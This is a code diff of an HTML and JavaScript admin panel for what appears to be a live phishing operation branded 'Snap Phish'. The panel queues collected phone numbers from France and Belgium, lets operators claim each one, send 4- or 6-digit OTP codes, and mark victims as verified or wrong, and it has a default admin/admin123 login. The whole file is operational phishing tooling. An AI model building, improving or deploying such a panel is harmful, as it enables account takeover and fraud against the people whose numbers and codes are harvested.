@@ -1,70 +1,234 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel — Phish Control</title>
-    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Admin Panel — Snap Phish</title>
     <style>
-        .admin-container { max-width: 900px; margin: 0 auto; padding: 20px; }
-        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
-        .admin-header h1 { color: #fff; font-size: 24px; }
-        .admin-header .logout { color: #ff4444; cursor: pointer; }
-        .queue-selector { display: flex; gap: 12px; margin-bottom: 20px; }
-        .queue-btn { padding: 10px 24px; border-radius: 12px; border: 2px solid #2a2a2a; background: #141414; color: #fff; cursor: pointer; transition: all 0.2s; }
-        .queue-btn.active { border-color: #FFFC00; background: #1a1a1a; }
-        .queue-btn .badge { background: #FFFC00; color: #000; padding: 2px 10px; border-radius: 20px; font-size: 12px; margin-left: 8px; }
-        .number-card { background: #1e1e1e; border-radius: 16px; padding: 20px; margin-bottom: 16px; border: 1px solid #2a2a2a; }
-        .number-card .number { font-size: 20px; font-weight: 600; color: #fff; }
-        .number-card .meta { color: #888; font-size: 14px; margin: 4px 0; }
-        .number-card .actions { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
-        .number-card .actions button { padding: 8px 16px; border-radius: 8px; border: none; cursor: pointer; font-size: 13px; transition: all 0.2s; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: #0f0f0f;
+            padding: 20px;
+            color: #fff;
+        }
+
+        .admin-container { max-width: 1000px; margin: 0 auto; }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+            background: #1a1a1a;
+            border-radius: 16px;
+            border: 1px solid #2a2a2a;
+            margin-bottom: 24px;
+        }
+
+        .admin-header h1 { font-size: 22px; font-weight: 600; }
+        .admin-header h1 span { color: #FFFC00; }
+        .admin-header .logout { color: #ff6b6b; cursor: pointer; font-size: 14px; }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .stat-card {
+            background: #1a1a1a;
+            padding: 16px;
+            border-radius: 14px;
+            border: 1px solid #2a2a2a;
+            text-align: center;
+        }
+
+        .stat-card .num { font-size: 28px; font-weight: 700; color: #FFFC00; }
+        .stat-card .label { color: #888; font-size: 12px; margin-top: 4px; }
+
+        .queue-tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .queue-tab {
+            padding: 10px 20px;
+            border-radius: 12px;
+            border: 2px solid #2a2a2a;
+            background: #141414;
+            color: #fff;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .queue-tab:hover { border-color: #444; }
+        .queue-tab.active { border-color: #FFFC00; background: #1a1a1a; }
+        .queue-tab .badge {
+            background: #FFFC00;
+            color: #000;
+            padding: 1px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-left: 6px;
+        }
+
+        .numbers-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .number-card {
+            background: #1a1a1a;
+            border-radius: 14px;
+            padding: 16px 20px;
+            border: 1px solid #2a2a2a;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            transition: border-color 0.2s;
+        }
+
+        .number-card .info { flex: 1; min-width: 150px; }
+        .number-card .info .num { font-size: 18px; font-weight: 600; color: #fff; }
+        .number-card .info .meta { color: #888; font-size: 13px; margin-top: 2px; }
+
+        .number-card .actions {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 8px;
+        }
+
+        .number-card .actions button {
+            padding: 8px 16px;
+            border-radius: 10px;
+            border: none;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .number-card .actions button:hover { transform: scale(1.03); }
+
+        .btn-claim { background: #FFFC00; color: #000; }
         .btn-otp4 { background: #FFFC00; color: #000; }
-        .btn-otp6 { background: #FFAA00; color: #000; }
-        .btn-wrong { background: #ff4444; color: #fff; }
-        .btn-verified { background: #00cc44; color: #fff; }
-        .btn-otp4:hover, .btn-otp6:hover { transform: scale(1.02); }
-        .empty-state { text-align: center; color: #555; padding: 40px; }
-        .otp-display { background: #141414; padding: 8px 16px; border-radius: 8px; font-family: monospace; font-size: 24px; color: #FFFC00; display: inline-block; margin: 8px 0; }
-        .login-form { max-width: 400px; margin: 100px auto; background: #1e1e1e; padding: 40px; border-radius: 24px; }
-        .login-form h2 { color: #fff; text-align: center; margin-bottom: 24px; }
-        .login-form input { width: 100%; padding: 14px; border-radius: 12px; border: 2px solid #2a2a2a; background: #141414; color: #fff; font-size: 16px; margin-bottom: 12px; outline: none; }
-        .login-form input:focus { border-color: #FFFC00; }
-        .login-form button { width: 100%; padding: 14px; border-radius: 12px; border: none; background: #FFFC00; color: #000; font-size: 18px; font-weight: 600; cursor: pointer; }
-        .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 12px; margin-bottom: 20px; }
-        .stat-card { background: #141414; padding: 16px; border-radius: 12px; text-align: center; border: 1px solid #2a2a2a; }
-        .stat-card .stat-value { color: #FFFC00; font-size: 28px; font-weight: 700; }
-        .stat-card .stat-label { color: #666; font-size: 12px; margin-top: 4px; }
+        .btn-otp6 { background: #ffaa00; color: #000; }
+        .btn-wrong { background: #ff6b6b; color: #fff; }
+        .btn-verified { background: #69db7c; color: #000; }
+        .btn-claimed { background: #333; color: #888; cursor: not-allowed; }
+
+        .otp-display {
+            display: inline-block;
+            background: #141414;
+            padding: 4px 16px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 20px;
+            color: #FFFC00;
+            margin-right: 8px;
+        }
+
+        .empty-state {
+            text-align: center;
+            color: #555;
+            padding: 40px 20px;
+            font-size: 15px;
+        }
+
+        .login-box {
+            max-width: 380px;
+            margin: 80px auto;
+            background: #1a1a1a;
+            padding: 32px 28px;
+            border-radius: 24px;
+            border: 1px solid #2a2a2a;
+        }
+
+        .login-box h2 { text-align: center; margin-bottom: 20px; color: #fff; }
+        .login-box input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: 2px solid #2a2a2a;
+            background: #121212;
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 12px;
+            outline: none;
+        }
+        .login-box input:focus { border-color: #FFFC00; }
+        .login-box button {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: none;
+            background: #FFFC00;
+            color: #000;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .login-box button:hover { transform: scale(1.02); }
+
+        .hidden { display: none !important; }
+
+        @media (max-width: 600px) {
+            .number-card { flex-direction: column; align-items: stretch; }
+            .number-card .actions { justify-content: center; }
+        }
     </style>
 </head>
 <body>
-    <div id="loginPage" style="display:none;">
-        <div class="login-form">
+
+    <!-- LOGIN -->
+    <div id="loginPage">
+        <div class="login-box">
             <h2>🔐 Admin Login</h2>
-            <input type="text" id="loginUser" placeholder="Username" value="admin">
-            <input type="password" id="loginPass" placeholder="Password" value="admin123">
+            <input type="text" id="loginUser" placeholder="Username" value="admin" />
+            <input type="password" id="loginPass" placeholder="Password" value="admin123" />
             <button onclick="login()">Login →</button>
             <p style="color:#555;text-align:center;margin-top:12px;font-size:13px;">Default: admin / admin123</p>
         </div>
     </div>
 
-    <div id="adminPage" style="display:none;">
+    <!-- ADMIN PANEL -->
+    <div id="adminPage" class="hidden">
         <div class="admin-container">
             <div class="admin-header">
-                <h1>💀 Phish Control Panel</h1>
+                <h1>💀 <span>Snap</span>Phish</h1>
                 <span class="logout" onclick="logout()">Logout</span>
             </div>
 
-            <div class="stats-row" id="statsRow"></div>
-
-            <div class="queue-selector">
-                <button class="queue-btn active" onclick="switchQueue('A')">🇫🇷 France <span class="badge" id="countA">0</span></button>
-                <button class="queue-btn" onclick="switchQueue('B')">🇧🇪 Belgium <span class="badge" id="countB">0</span></button>
-                <button class="queue-btn" onclick="switchQueue('C')">🌍 Both <span class="badge" id="countC">0</span></button>
+            <div class="stats-grid" id="statsGrid">
+                <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total</div></div>
+                <div class="stat-card"><div class="num" id="statPending">0</div><div class="label">Pending</div></div>
+                <div class="stat-card"><div class="num" id="statVerified">0</div><div class="label">Verified</div></div>
+                <div class="stat-card"><div class="num" id="statWrong">0</div><div class="label">Wrong</div></div>
             </div>
 
-            <div id="queueList">
-                <div class="empty-state">Select a queue to view numbers.</div>
+            <div class="queue-tabs" id="queueTabs">
+                <div class="queue-tab active" onclick="switchQueue('A')">🇫🇷 France <span class="badge" id="countA">0</span></div>
+                <div class="queue-tab" onclick="switchQueue('B')">🇧🇪 Belgium <span class="badge" id="countB">0</span></div>
+                <div class="queue-tab" onclick="switchQueue('C')">🌍 Both <span class="badge" id="countC">0</span></div>
+            </div>
+
+            <div id="numbersContainer">
+                <div class="empty-state">Select a queue to view pending numbers.</div>
             </div>
         </div>
     </div>
@@ -72,8 +236,11 @@
     <script>
         let token = null;
         let currentQueue = 'A';
-        let interval = null;
+        let refreshInterval = null;
 
+        // ============================================================
+        // LOGIN
+        // ============================================================
         function login() {
             const username = document.getElementById('loginUser').value;
             const password = document.getElementById('loginPass').value;
@@ -87,10 +254,10 @@
             .then(data => {
                 if (data.success) {
                     token = data.token;
-                    document.getElementById('loginPage').style.display = 'none';
-                    document.getElementById('adminPage').style.display = 'block';
+                    document.getElementById('loginPage').classList.add('hidden');
+                    document.getElementById('adminPage').classList.remove('hidden');
                     loadQueues();
-                    interval = setInterval(loadQueues, 5000);
+                    refreshInterval = setInterval(loadQueues, 3000);
                 } else {
                     alert('Invalid credentials');
                 }
@@ -98,19 +265,25 @@
         }
 
         function logout() {
-            clearInterval(interval);
+            clearInterval(refreshInterval);
             token = null;
-            document.getElementById('adminPage').style.display = 'none';
-            document.getElementById('loginPage').style.display = 'block';
+            document.getElementById('adminPage').classList.add('hidden');
+            document.getElementById('loginPage').classList.remove('hidden');
         }
 
+        // ============================================================
+        // QUEUE SWITCH
+        // ============================================================
         function switchQueue(queue) {
             currentQueue = queue;
-            document.querySelectorAll('.queue-btn').forEach(el => el.classList.remove('active'));
-            document.querySelector(`.queue-btn[onclick="switchQueue('${queue}')"]`).classList.add('active');
+            document.querySelectorAll('.queue-tab').forEach(el => el.classList.remove('active'));
+            document.querySelector(`.queue-tab[onclick="switchQueue('${queue}')"]`).classList.add('active');
             loadQueues();
         }
 
+        // ============================================================
+        // LOAD QUEUES
+        // ============================================================
         function loadQueues() {
             fetch('/api/admin/queues')
                 .then(res => res.json())
@@ -120,42 +293,70 @@
                     document.getElementById('countB').textContent = data.B?.filter(e => e.status === 'pending').length || 0;
                     document.getElementById('countC').textContent = data.C?.filter(e => e.status === 'pending').length || 0;
 
-                    // Update stats
-                    const total = Object.values(data).flat().length;
-                    const pending = Object.values(data).flat().filter(e => e.status === 'pending').length;
-                    const verified = Object.values(data).flat().filter(e => e.status === 'verified').length;
-                    document.getElementById('statsRow').innerHTML = `
-                        <div class="stat-card"><div class="stat-value">${total}</div><div class="stat-label">Total Numbers</div></div>
-                        <div class="stat-card"><div class="stat-value">${pending}</div><div class="stat-label">Pending</div></div>
-                        <div class="stat-card"><div class="stat-value">${verified}</div><div class="stat-label">Verified</div></div>
-                    `;
+                    // Stats
+                    const all = Object.values(data).flat();
+                    document.getElementById('statTotal').textContent = all.length;
+                    document.getElementById('statPending').textContent = all.filter(e => e.status === 'pending').length;
+                    document.getElementById('statVerified').textContent = all.filter(e => e.status === 'verified').length;
+                    document.getElementById('statWrong').textContent = all.filter(e => e.status === 'wrong').length;
 
-                    // Show queue
+                    // Render queue
                     const entries = data[currentQueue] || [];
-                    const pendingEntries = entries.filter(e => e.status === 'pending');
-                    const list = document.getElementById('queueList');
-                    
-                    if (pendingEntries.length === 0) {
-                        list.innerHTML = '<div class="empty-state">🎯 No pending numbers in this queue.</div>';
+                    const pending = entries.filter(e => e.status === 'pending' || e.status === 'otp_sent');
+                    const container = document.getElementById('numbersContainer');
+
+                    if (pending.length === 0) {
+                        container.innerHTML = '<div class="empty-state">🎯 No pending numbers in this queue.</div>';
                         return;
                     }
 
-                    list.innerHTML = pendingEntries.map(entry => `
+                    container.innerHTML = pending.map(entry => `
                         <div class="number-card" id="card-${entry.id}">
-                            <div class="number">📱 ${entry.number}</div>
-                            <div class="meta">${entry.country} · ${entry.network} · ${entry.timestamp.slice(0,16)}</div>
-                            <div id="otpDisplay-${entry.id}"></div>
-                            <div class="actions">
-                                <button class="btn-otp4" onclick="sendOTP('${entry.id}', 4)">🔢 4-Digit OTP</button>
-                                <button class="btn-otp6" onclick="sendOTP('${entry.id}', 6)">🔢 6-Digit OTP</button>
-                                <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong Number</button>
-                                <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
+                            <div class="info">
+                                <div class="num">📱 ${entry.number}</div>
+                                <div class="meta">${entry.country} · ${entry.network} · ${entry.timestamp.slice(0,16)}</div>
+                                ${entry.otp ? `<div class="otp-display">📨 ${entry.otp}</div>` : ''}
+                                ${entry.status === 'otp_sent' ? '<span style="color:#FFFC00;font-size:13px;">⏳ OTP Sent</span>' : ''}
+                            </div>
+                            <div class="actions" id="actions-${entry.id}">
+                                ${entry.status === 'pending' ? `
+                                    <button class="btn-claim" onclick="claimNumber('${entry.id}')">🎯 Claim</button>
+                                ` : `
+                                    <button class="btn-otp4" onclick="sendOTP('${entry.id}', 4)">🔢 4-Digit</button>
+                                    <button class="btn-otp6" onclick="sendOTP('${entry.id}', 6)">🔢 6-Digit</button>
+                                    <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
+                                    <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
+                                `}
                             </div>
                         </div>
                     `).join('');
                 });
         }
 
+        // ============================================================
+        // CLAIM NUMBER
+        // ============================================================
+        function claimNumber(queueId) {
+            // Update UI to show claimed
+            const actions = document.getElementById(`actions-${queueId}`);
+            actions.innerHTML = `
+                <button class="btn-otp4" onclick="sendOTP('${queueId}', 4)">🔢 4-Digit</button>
+                <button class="btn-otp6" onclick="sendOTP('${queueId}', 6)">🔢 6-Digit</button>
+                <button class="btn-wrong" onclick="markWrong('${queueId}')">❌ Wrong</button>
+                <button class="btn-verified" onclick="markVerified('${queueId}')">✅ Verified</button>
+            `;
+            
+            // Also update status in backend
+            fetch('/api/admin/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ queueId: queueId, action: 'claimed' })
+            }).catch(() => {});
+        }
+
+        // ============================================================
+        // OTP ACTIONS
+        // ============================================================
         function sendOTP(queueId, length) {
             const otp = String(Math.floor(Math.random() * (length === 4 ? 9000 : 900000)) + (length === 4 ? 1000 : 100000));
             
@@ -171,39 +372,50 @@
             .then(res => res.json())
             .then(data => {
                 if (data.success) {
-                    document.getElementById(`otpDisplay-${queueId}`).innerHTML = `<div class="otp-display">📨 ${otp}</div>`;
-                    document.getElementById(`card-${queueId}`).style.borderColor = '#FFFC00';
-                    setTimeout(() => {
-                        document.getElementById(`card-${queueId}`).style.borderColor = '#2a2a2a';
-                    }, 3000);
+                    // Update UI
+                    const card = document.getElementById(`card-${queueId}`);
+                    const info = card.querySelector('.info');
+                    const otpDisplay = document.createElement('div');
+                    otpDisplay.className = 'otp-display';
+                    otpDisplay.textContent = `📨 ${otp}`;
+                    
+                    // Remove old OTP display if exists
+                    const oldOtp = card.querySelector('.otp-display');
+                    if (oldOtp) oldOtp.remove();
+                    
+                    info.appendChild(otpDisplay);
+                    
+                    // Add status
+                    const statusSpan = document.createElement('span');
+                    statusSpan.style.cssText = 'color:#FFFC00;font-size:13px;margin-left:8px;';
+                    statusSpan.textContent = '⏳ OTP Sent';
+                    const oldStatus = card.querySelector('span[style]');
+                    if (oldStatus) oldStatus.remove();
+                    info.appendChild(statusSpan);
                 }
             });
         }
 
         function markWrong(queueId) {
-            if (!confirm('Mark this number as wrong?')) return;
+            if (!confirm('Mark as wrong number?')) return;
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ queueId: queueId, action: 'wrong' })
             })
-            .then(res => res.json())
             .then(() => loadQueues());
         }
 
         function markVerified(queueId) {
-            if (!confirm('Mark this number as verified?')) return;
+            if (!confirm('Mark as verified?')) return;
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ queueId: queueId, action: 'verified' })
             })
-            .then(res => res.json())
             .then(() => loadQueues());
         }
-
-        // Check if already logged in
-        document.getElementById('loginPage').style.display = 'block';
     </script>
+
 </body>
 </html>
